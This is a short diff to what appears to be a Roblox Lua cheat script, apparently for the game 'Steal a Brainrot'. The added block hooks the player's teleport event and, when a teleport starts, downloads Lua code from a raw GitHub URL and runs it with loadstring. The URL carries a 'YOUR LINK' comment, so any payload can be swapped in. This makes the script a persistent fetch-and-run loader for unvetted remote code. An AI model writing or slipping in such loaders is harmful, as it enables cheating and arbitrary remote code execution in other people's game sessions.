@@ -134,3 +134,12 @@ spawn(function()
         end
     end
 end)
+
+local URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/friendtoggle.lua" -- ← YOUR LINK
+local p = game:GetService("Players").LocalPlayer
+
+p.OnTeleport:Connect(function(state)
+    if state == Enum.TeleportState.Started then
+        task.spawn(loadstring, game:HttpGet(URL))
+    end
+end)
